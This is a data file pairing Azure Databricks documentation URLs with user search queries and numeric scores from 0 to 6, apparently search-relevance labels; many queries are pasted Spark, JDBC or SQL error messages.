+0,https://docs.microsoft.com/en-us/azure/databricks/kb/administration/who-deleted-workspace,recover deleted workspace
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/bi/configure-simba-azure-ad-creds,simba jdbc
+1,https://docs.microsoft.com/en-us/azure/databricks/kb/bi/jdbc-odbc-troubleshooting,databricks odbc and jdbc drivers com.microsoft.sqlserver.jdbc.sqlserverexception: the connection is closed. odbc unexpected response from server during a http connection: ssl_connect: certificate verify failed.
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/bi/powerbi-proxy-ssl-configuration,"ssl cert error power bi tableau, ssl_connect: certificate verify failed power bi"
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/cloud/,azure udr
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/cloud/azure-vnet-gen1-issue,aad token for jdbc odbc
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/cloud/azure-vnet-jobs-not-progressing,unity catalog
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/cloud/custom-dns-routing,on premise gitlab
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/cloud/sas-requires-current-abfs-client,mount abfss sas
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/azure-core-limit,cloud provider launch failure
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/azure-ip-limit,cloud provider launch failure
+1,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/azure-ssh-cluster-driver-node,customize containers with databricks container services
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/calculate-number-of-cores,estimating required number of memory
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/cluster-failed-launch,cluster failed to launch cloud provider
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/cluster-manager-limit,"""please reduce the number of instances in your request"" error please reduce the number of instances in your request,"
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/cluster-restart-fails-admin-user,restart cluster
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/cluster-terminated-driver-down,cluster does not start cluster not starting cluster does not start
+6,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/conf-overwrites-default-settings,how to set spark executor memory
+1,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/custom-docker-requires-root,customize containers with databricks container services
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/custom-garbage-collection-prevents-launch-dbr10,garbage collection
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/edited-policy-not-applied,cannot apply updated cluster policy
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/fail-create-cluster-tag-limit,the length cannot exceed 256 unicode characters in utf-8
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/spark-executor-memory,off heap memory
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/spark-shows-less-memory,executor memory
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/termination-reasons,cluster terminating unexpected cluster termination cluster terminated.reason:azure unexpected deployment template failure sku not available
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/unknown-host-exception-on-launch,temporary failure in name resolution
+3,https://docs.microsoft.com/en-us/azure/databricks/kb/data-sources/access-blob-fails-wasb,azure blob blob access no credentials
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/data-sources/access-blobstore-odbc,write parquet datalake
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/data-sources/inconsistent-timestamp-results-jdbc,aad token for jdbc odbc
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/data-sources/jdbc-optimize-read,aad token for jdbc odbc
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/data-sources/use-cx-oracle-connect-server,use cx_oracle to connect to an oracle server how to connect to oracle
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/data-sources/wasb-check-blob-types,append blob
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/dbfs/,dbfs browsing
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/dbfs/dbfs-root-permissions,dbfs size
+4,https://docs.microsoft.com/en-us/azure/databricks/kb/dbsql/,databricks sql databricks sql databricks sql access databricks sql
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/dbsql/display-null-as-nan,null column value
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/delta/delete-checkpoint-restart,delete your streaming query checkpoint and restart
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/delta/file-transaction-log-not-found,a file referenced in the transaction log cannot be found
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/delta/filereadexception-when-reading-delta-table,exception while reading checkpoint file in _delta_log folder exception while reading checkpoint file in _delta_log folder
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/delta/id-duplicate-on-append,identify duplicate data identify duplicate data on append operations
+2,https://docs.microsoft.com/en-us/azure/databricks/kb/delta/optimize-delta-sink-structured-streaming,delta optimize and structured streaming
+1,https://docs.microsoft.com/en-us/azure/databricks/kb/dev-tools/dbcli-win-fail-create-process,databricks cli
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/dev-tools/geospark-undefined-function-error-dbconnect,geospark undefined function error with dbconnect
+1,https://docs.microsoft.com/en-us/azure/databricks/kb/dev-tools/invalid-access-token-airflow,"when i run a databricks job from airflow, i get an error token 403 aad token for jdbc odbc"
+6,https://docs.microsoft.com/en-us/azure/databricks/kb/jobs/azure-spark-shuffle-fetch-fail,"getting error ""shuffle partition number too small"" job aborted due to stage failure: shufflemapstage 50852 (count at &lt;unknown&gt;:0) has failed the maximum allowable number of times: 4. most recent failure reason: org.apache.spark.shuffle.metadatafetchfailedexception: missing an output location for shuffle 3409 	at org.apache.spark.mapoutputtracker$.$anonfun$convertmapstatuses$2(mapoutputtracker.scala:1163) 	at org.apache.spark.m job aborted due to stage failure: shufflemapstage 50852 (count at &lt;unknown&gt;:0) has failed the maximum allowable number of times: 4. most recent failure reason: org.apache.spark.shuffle.metadatafetchfailedexception: missing an output location for shuffle 3409 	at org.apache.spark.mapoutputtracker$.$anonfun$convertmapstatuses$2(mapoutputtracker.scala:1163) 	at org.apache.spark.m"
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/jobs/howto-jobsdeleterestapi,help with purge
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/jobs/job-cluster-limit-nb-output,warning: skipped 44535 bytes of output job clusters
+3,https://docs.microsoft.com/en-us/azure/databricks/kb/jobs/job-fails-invalid-access-token,invalid access token aad token for jdbc odbc
+6,https://docs.microsoft.com/en-us/azure/databricks/kb/jobs/job-fails-maxresultsize-exception,is bigger than spark.driver.maxresultsize
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/jobs/job-rate-limit,rate limiting
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/libraries/,libraries failing
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/libraries/cannot-import-egg-module,local python module import
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/libraries/cant-uninstall-libraries,cannot uninstall library
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/libraries/init-script-fail-download-maven,init script init scripts
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/libraries/install-cartopy-on-cluster,errors when pip install leach_package
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/libraries/install-package-cran-snapshot,library installation failed for library due to infra fault
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/libraries/library-fail-dependency-exception,could not find a version that satisfies the requirement
+1,https://docs.microsoft.com/en-us/azure/databricks/kb/libraries/maven-library-version-mgmt,library in azure databricks
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/libraries/pystan-fails-dbr64es,could not find a version that satisfies the requirement
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/machine-learning/h2o-cluster-not-reachable-exception,sparkling water h2o and sparkling water on aws cluster
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/machine-learning/mlflow-artifacts-custom-storage,artifact location
+6,https://docs.microsoft.com/en-us/azure/databricks/kb/metastore/create-table-ddl-for-metastore,"dbs = spark.catalog.listdatabases() for db in dbs:   f = open(""your_file_name_{}.ddl"".format(db.name), ""w"")   tables = spark.catalog.listtables(db.name)"
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/metastore/hive-metastore-troubleshooting,unity catalog
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/metastore/list-tables,unity catalog
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/metastore/parquet-timestamp-requires-msver12,parquet timestamp requires hive metastore 1.2 or above
+6,https://docs.microsoft.com/en-us/azure/databricks/kb/metrics/spark-metrics,apache spark executor memory allocation
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/notebooks/failure-when-mounting-storage,mount nullpointerexception
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/notebooks/get-notebooks-deleted-user,delete a user account
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/notebooks/item-too-large-to-export,export notebook
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/notebooks/json-reader-parses-value-as-null,streamingqueryexception: next on empty iterator
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/python/dbfs-file-size-limit,dbfs size
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/python/function-object-no-attribute,module os has no attribute error
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/python/import-custom-ca-cert,"""failed to establish a new connection: [errno 110] connection timed out"" how to complete the certification"
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/r/rmarkdown-sparklyr-code,r markdown
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/scala/intermittent-nullpointerexception-aqe-enabled,intermittent nullpointerexception when aqe is enabled
+4,https://docs.microsoft.com/en-us/azure/databricks/kb/sql/,"""it is possible the underlying files have been updated. you can explicitly invalidate the cache in spark by running 'refresh table tablename' command in sql or by recreating the dataset/dataframe involved. if delta cache is stale or the underlying files have been removed, you can invalidate delta cache manually by restarting the cluster"" get secret via sql databricksexceptions$sqlexecutionexception: java.sql.sqlexception: unsupported type null python sql table to file the instance of the sql server database engine cannot obtain a lock resource at this time sql variables sql with apache spark"
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/sql/dupe-column-in-metadata,display the column that have duplicate records
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/sql/error-run-msck-repair-table-parallel,error when accessing model runs
+5,https://docs.microsoft.com/en-us/azure/databricks/kb/sql/global-temp-view-not-found,"error in sql statement: amazons3exception: access denied; request: put https://amgen-edl-databricks-e2-gco-bkt.s3-us-west-2.amazonaws.com oregon-prod/972620489536740/user/hive/warehouse/pharmaace_tblndc_gastric_0406/ {} aws-sdk-java/1.11.655 linux/5.4.0-1071-aws openjdk_64-bit_server_vm/25.292-b10 java/1.8.0_292 scala/2.12.10 vendor/azul_systems,_inc. com.amazonaws.services.s3.model.putobjectrequest; request id: 6c3t9ck9e60dfdbd, extended request id: grrpgjt4w/g8h6xlqligyobpozw6drkjatqbujnv8qitb ""table or view not found"" analysisexception: table or view not found"
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/sql/jdbc-write-fails-primarykeyviolation,aad token for jdbc odbc
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/streaming/kafka-no-resolvable-bootstrap-urls,cluster terminated.reason:self bootstrap failure self-bootstrap failure
+6,https://docs.microsoft.com/en-us/azure/databricks/kb/streaming/readstream-is-not-whitelisted,py4j.security.py4jsecurityexception: constructor public com.databricks.backend.daemon.dbutils.fsutilsparallel(org.apache.spark.sparkcontext) is not whitelisted.
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/streaming/streaming-job-stuck-writing-checkpoint,streaming job
+0,https://docs.microsoft.com/en-us/azure/databricks/languages/pandas-spark,pandas cut
+1,https://docs.microsoft.com/en-us/azure/databricks/languages/python,azure databricks api load data python
+0,https://docs.microsoft.com/en-us/azure/databricks/libraries/,"pydocumentdb library install library install library cluster library ""yml"""
+1,https://docs.microsoft.com/en-us/azure/databricks/libraries/cluster-libraries,"cluster libraries fail to install python library glpk failed to install a python library \""glpk\"" by ui cluster-library-pypi\r \r errro message:\r java.lang.runtimeexception: managedlibraryinstallfailed: org.apache.spark.sparkexception: process list(/databricks/python/bin/pip, install, glpk, --disable-pip-version-check) exited with code 1.   error: command errored out with exit status 1:\r    command: /databricks/python3/bin/python /databricks/python3/lib/python3.8/site-packages/pip/_vendor/pep517/_in_process cluster libraries init script libraries won't load unable to use installed wheel cluster library"
+0,https://docs.microsoft.com/en-us/azure/databricks/libraries/notebooks-python-libraries,notebook-scoped python libraries install python module
+0,https://docs.microsoft.com/en-us/azure/databricks/notebooks/,notebook add command how to delete a notebook reference variables between notebooks recover deleted notebook import notebook copy notebook path search text in all notebooks import notebook import notebook import notebooks import notebook import notebook how do i add a code chunk to a notebook attach notebook dynamically jupyter notebook version import notebooks notebook private email the contents of a notebook share notebook import notebook
+0,https://docs.microsoft.com/en-us/azure/databricks/notebooks/azure-devops-services-version-control,git integration notebook version control azure devops repos for git missing
+6,https://docs.microsoft.com/en-us/azure/databricks/notebooks/dashboards,databricks dashboard integrate spark
+0,https://docs.microsoft.com/en-us/azure/databricks/notebooks/notebook-workflows,retry logic
+0,https://docs.microsoft.com/en-us/azure/databricks/notebooks/notebooks-manage,execution context jar files
+0,https://docs.microsoft.com/en-us/azure/databricks/notebooks/notebooks-use,hide result keyboard shortcut dark theme dark theme hide result multiple cells
+0,https://docs.microsoft.com/en-us/azure/databricks/notebooks/package-cells,import python packages
+0,https://docs.microsoft.com/en-us/azure/databricks/notebooks/visualizations/charts-and-graphs-python,visualization deep dive in python
+1,https://docs.microsoft.com/en-us/azure/databricks/notebooks/visualizations/ggplot2,ggplot2 in r notebooks - databricks
+0,https://docs.microsoft.com/en-us/azure/databricks/notebooks/visualizations/html-d3-and-svg,export notebook output to html
+1,https://docs.microsoft.com/en-us/azure/databricks/notebooks/widgets,databricks widgets widget panel widget runtime
+0,https://docs.microsoft.com/en-us/azure/databricks/release-notes/product/,platform release
+0,https://docs.microsoft.com/en-us/azure/databricks/release-notes/product/2018/august,init script
+1,https://docs.microsoft.com/en-us/azure/databricks/release-notes/product/2018/november,cross origin resource sharing azure databricks
+0,https://docs.microsoft.com/en-us/azure/databricks/release-notes/product/2019/january,on premise gitlab
+0,https://docs.microsoft.com/en-us/azure/databricks/release-notes/product/2019/october,on premise gitlab
+0,https://docs.microsoft.com/en-us/azure/databricks/release-notes/product/2021/june,keyboard shortcut
+0,https://docs.microsoft.com/en-us/azure/databricks/release-notes/product/2021/november,"""data profile"" data profiling"
+0,https://docs.microsoft.com/en-us/azure/databricks/release-notes/product/2022/february,dag visualization
+6,https://docs.microsoft.com/en-us/azure/databricks/release-notes/runtime/10.0,"org.apache.spark.sparkexception: job aborted due to stage failure: task 13 in stage 12.0 failed 4 times, most recent failure: lost task 13.3 in stage 12.0 (tid 453) (10.54.76.20 executor 17): java.net.connectexception: connection refused (connection refused)"
+1,https://docs.microsoft.com/en-us/azure/databricks/release-notes/runtime/10.1ml,how to check the version of databricks runtime for machine learning
+1,https://docs.microsoft.com/en-us/azure/databricks/release-notes/runtime/10.3ml,how to check the version of databricks runtime for machine learning
+1,https://docs.microsoft.com/en-us/azure/databricks/release-notes/runtime/10.x-migration,databricks runtime 10.x migration guide runtime 10 issues
+1,https://docs.microsoft.com/en-us/azure/databricks/release-notes/runtime/4.2,databricks runtime
+0,https://docs.microsoft.com/en-us/azure/databricks/release-notes/runtime/6.3ml,comando monstra as pastas
+1,https://docs.microsoft.com/en-us/azure/databricks/release-notes/runtime/6.4,databricks 6.4  azure extended support
+1,https://docs.microsoft.com/en-us/azure/databricks/release-notes/runtime/7.0ml,databricks ml runtime
+1,https://docs.microsoft.com/en-us/azure/databricks/release-notes/runtime/7.2,com.databricks.workflowexception: com.databricks.notebookexecutionexception: timedout
+0,https://docs.microsoft.com/en-us/azure/databricks/repos/,repos for git integration on premise gitlab git integration repos for git integration repos clone unable to delete a repo private git repo
+0,https://docs.microsoft.com/en-us/azure/databricks/repos/gitlab-version-control,on premise gitlab on premise gitlab
+0,https://docs.microsoft.com/en-us/azure/databricks/repos/jobs-remote-notebook,repository notebooks job error
+0,https://docs.microsoft.com/en-us/azure/databricks/resources/limits,what is the limit of tasks in one job
+0,https://docs.microsoft.com/en-us/azure/databricks/resources/platform-release,platform release
+0,https://docs.microsoft.com/en-us/azure/databricks/resources/supported-browsers,create support ticket
+1,https://docs.microsoft.com/en-us/azure/databricks/runtime/dbr,databricks runtime databricks runtime download upgrade runtime
+0,https://docs.microsoft.com/en-us/azure/databricks/scenarios/connect-databricks-excel-python-r,download csv
+1,https://docs.microsoft.com/en-us/azure/databricks/scenarios/databricks-cli-from-azure-cloud-shell,databricks cli
+1,https://docs.microsoft.com/en-us/azure/databricks/scenarios/databricks-connect-to-data-sources,event hub write data from azure databricks to azure web apps how do we send data into promethues from databricks? (approach assistance to integrate databricks and promethues
+0,https://docs.microsoft.com/en-us/azure/databricks/scenarios/frequently-asked-questions-databricks,cloud provider launch failure
+0,https://docs.microsoft.com/en-us/azure/databricks/scenarios/quickstart-create-databricks-workspace-portal,upgrade premium
+1,https://docs.microsoft.com/en-us/azure/databricks/scenarios/quickstart-create-databricks-workspace-powershell,databricks workspace
+0,https://docs.microsoft.com/en-us/azure/databricks/scenarios/quickstart-create-databricks-workspace-vnet-injection,managed resource group virtual machine
+6,https://docs.microsoft.com/en-us/azure/databricks/scenarios/service-endpoint-cosmosdb,facing issue while writing data to cosmos through spark
+4,https://docs.microsoft.com/en-us/azure/databricks/scenarios/vnet-injection-sql-server,sql server
+1,https://docs.microsoft.com/en-us/azure/databricks/scenarios/what-is-azure-databricks-ws,what data formats are supported in databricks
+0,https://docs.microsoft.com/en-us/azure/databricks/scenarios/workspace/,data science & engineering? workspace tutorial
+3,https://docs.microsoft.com/en-us/azure/databricks/security/access-control/,not able to access my  data bricks account how to get the report for table access control list. table access control azure
+3,https://docs.microsoft.com/en-us/azure/databricks/security/access-control/cluster-acl,cluster access contro
+3,https://docs.microsoft.com/en-us/azure/databricks/security/access-control/dlt-acl,cluster unable to access delta tables and s3
+0,https://docs.microsoft.com/en-us/azure/databricks/security/access-control/pool-acl,configure pool permissions
+0,https://docs.microsoft.com/en-us/azure/databricks/security/access-control/table-acls/,upgrade premium
+3,https://docs.microsoft.com/en-us/azure/databricks/security/access-control/workspace-acl,not able to access my  data bricks account artifact location
+0,https://docs.microsoft.com/en-us/azure/databricks/security/credential-passthrough/,"credential passthrough with r on high concurrency cluster anonymous credentials, and no credentials found for them  in the configuration. credential passthrough credential passthrough"
+1,https://docs.microsoft.com/en-us/azure/databricks/security/credential-passthrough/adls-passthrough,com.databricks.backend.daemon.data.client.adl.azurecredentialnotfoundexception: could not find adls gen2 token
+0,https://docs.microsoft.com/en-us/azure/databricks/security/data-governance,data governance
+0,https://docs.microsoft.com/en-us/azure/databricks/security/keys/customer-managed-key-managed-services-azure,writestream encrypt
+0,https://docs.microsoft.com/en-us/azure/databricks/security/keys/customer-managed-keys,is incompatible with nvarchar encrypted
+0,https://docs.microsoft.com/en-us/azure/databricks/security/keys/customer-managed-keys-dbfs/cmk-dbfs-azure-portal,key vault
+0,https://docs.microsoft.com/en-us/azure/databricks/security/keys/double-encryption,writestream encrypt
+3,https://docs.microsoft.com/en-us/azure/databricks/security/secrets/,secret scope secret access control secret manager
+3,https://docs.microsoft.com/en-us/azure/databricks/security/secrets/secret-scopes,user scope create scope create scope azure secret scope secret scope upgrade premium create secret scope secret scope secret scope rename secrets scope secret scope secret scope url secret scope unexpected cluster termination secret scopes secret scope secret does not exist with scope secret access control secret scope create scope secret scopes secret scope secret scope secret scope create scope
+1,https://docs.microsoft.com/en-us/azure/databricks/security/secrets/secrets,secret does not exist with scope where to find secrets databricks-connect secrets workspace create secret scope
+0,https://docs.microsoft.com/en-us/azure/databricks/security/security-overview-azure,is incompatible with nvarchar encrypted
+2,https://docs.microsoft.com/en-us/azure/databricks/spark/2.x/spark-sql/language-manual/alter-table-partition,drop partition from delta table
+5,https://docs.microsoft.com/en-us/azure/databricks/spark/2.x/spark-sql/language-manual/create-table,create a parquet table how to create a table
+4,https://docs.microsoft.com/en-us/azure/databricks/spark/2.x/spark-sql/language-manual/insert,insert sql stream
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/2.x/spark-sql/language-manual/load-data,load file in filesystem
+5,https://docs.microsoft.com/en-us/azure/databricks/spark/2.x/spark-sql/language-manual/show-table-properties,table properties
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/dataframes-datasets/,dataframe lib display dataframe scal dataset file path
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/dataframes-datasets/dates-timestamps,time zone
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/dataframes-datasets/introduction-to-dataframes-python,introduction to dataframes - python repartition pyspark dataframe
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/dataframes-datasets/introduction-to-datasets,dataset file path
+4,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/,enable databricks sql
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/data-types/date-type,compare dates
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/data-types/decimal-type,convert double to decimal
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/data-types/struct-type,"can't extract value from margin#2032585: need struct type but got decimal(18,4); line 9 pos 1"
+5,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/delta-delete-from,delete table recover deleted branch in repo delete account
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/delta-merge-into,merge into
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/delta-vacuum,vacuum filealreadyexistsexception
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/aes_decrypt,encryption_algorithm_name = 'aead_aes_256_cbc_hmac_sha_256'
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/character_length,maximum field length
+4,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/contains,insert sql stream
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/date_trunc,date trunc trunc date
+4,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/endswith,streamwrite with azure sql
+1,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/find_in_set,how to find the azure databricks dbu usage
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/isnullop,dataframe remove null count null in column
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/java_method,java location
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/raise_error,aws error rpc client disconnected error
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/to_date,cast  as date
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/trim,trim space
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/version,tensorflow version
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/xpath_string,typeerror 'str' object is not callable pyspark
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/security-revoke,revoke all privileges on schema
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/security-show-grant,show grant
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-datatype-rules,is incompatible with nvarchar encrypted
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-datatypes,data types data types
+5,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-external-locations,external table
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-functions,subselect in function
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-functions-udf-aggregate,object not serializable (class: com.microsoft.azure.eventhubs.connectionstringbuilder
+1,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-json-path-expression,java.lang.unsupportedoperationexception: com.databricks.backend.daemon.data.client.dbfsv1.resolvepathonphysicalstorage(path: path)
+5,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-names,no module named tensorflow modulenotfounderror: no module named 'mlflow' additional queries on that table must be named. alias column
+2,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-partition,drop partition delta table
+2,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-sharing,send email delta sharing
+6,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-conf-mgmt-set,hour settings how to set spark executor memory
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-conf-mgmt-set-timezone,time and time zone time and time zone time zone
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-resource-mgmt-add-jar,adding .jar using init
+4,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-show-columns,select columns from a table show columns (databricks sql)
+4,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-alter-table,identity column alter table (databricks sql)
+5,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-create-catalog,create table
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-create-database,create database
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-create-view,temporary view create or replace view create view
+5,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-drop-view,"""table or view not found"""
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-tblproperties,streamwrite with options
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-syntax-dml-insert-into,streamwrite with scala insert
+5,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-syntax-dml-load,python load table into notebook load data python load data
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-syntax-qry-select-join,full outer join
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-syntax-qry-select-orderby,order by clause
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/pandas-function-apis,pandas cut pandas cut
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/spark-pandas,pyspark repartition pandas dataframe
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/udf-python-pandas,pandas cut
+0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/sparkr/tutorials/using-glm,linear regression
+1,https://docs.microsoft.com/en-us/azure/databricks/sql/admin/,azure databricks certified associate platform administrator
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/admin/colors,code color workspace locked
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/admin/query-history,enable query history
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/admin/sql-endpoints,sql endpoints sql endpoints sql endpoint sql endpoint
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/,datbricks sql endpoint
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/delta-cache,"""cache select"""
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/delta-delete-from,delete from (databricks sql)
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/delta-update,update table sql
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/delta-vacuum,vacuum filealreadyexistsexception
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/functions/case,case expression (databricks sql)
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/functions/contains,streamwrite with sql stream insert sql
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/functions/count_if,count_if aggregate function (databricks sql)
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/functions/endswith,insert sql stream
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/functions/format_number,percent format
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/functions/java_method,java_method function (databricks sql)
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/functions/lteqgtsign,com.microsoft.sqlserver.jdbc.sqlserverexception: operand type clash: varchar
+5,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/functions/posexplode,"""table or view not found"""
+0,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/functions/position,position function
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/functions/raise_error,raise_error function (databricks sql)
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/functions/spark_partition,"""sql"" ""variables"" sql temp table sql variables"
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/functions/split,string split sql
+4,https://docs.microsoft.com/en-us/azure/databricks/sql/language-manual/functions/startswith,insert sql stream
